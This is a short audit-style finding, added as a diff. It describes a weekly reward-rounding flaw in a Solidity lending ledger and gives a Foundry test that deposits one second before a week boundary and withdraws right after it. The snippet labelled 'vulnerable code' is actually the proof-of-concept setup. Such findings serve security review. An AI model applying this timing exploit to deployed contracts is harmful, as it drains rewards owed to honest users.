@@ -1,0 +1,22 @@
+Type of vulnerability: Time Manipulation / Reward Exploit
+Cause of vulnerability: The contract rounds down to the start of the week for reward calculations, allowing users to deposit just before the end of the week and withdraw right after, receiving rewards as if they had their deposit for the entire week.
+Execution process: A user deposits funds into the market at 23:59 on the last day of the week, then withdraws at 00:00 on the first day of the next week, effectively receiving a full week's reward without maintaining the deposit for the entire week.
+Vulnerable code: 
+```solidity
+function setupStateBeforeClaim() internal {
+    whiteListMarket();
+    vm.prank(goverance);
+    ledger.setRewards(0, WEEK*10, amountPerEpoch);
+    // deposit into market at 23:59 (week 4)
+    vm.warp((WEEK * 5) - 1);
+    int256 delta = 1.1 ether;
+    vm.prank(lendingMarket);
+    ledger.sync_ledger(lender, delta);
+    // airdrop ledger enough token balance for user to claim
+    payable(ledger).transfer(1000 ether);
+    // withdraw at 00:00 (week 5)
+    vm.warp(block.timestamp + 1);
+    vm.prank(lendingMarket);
+    ledger.sync_ledger(lender, delta * (-1));
+}
+```
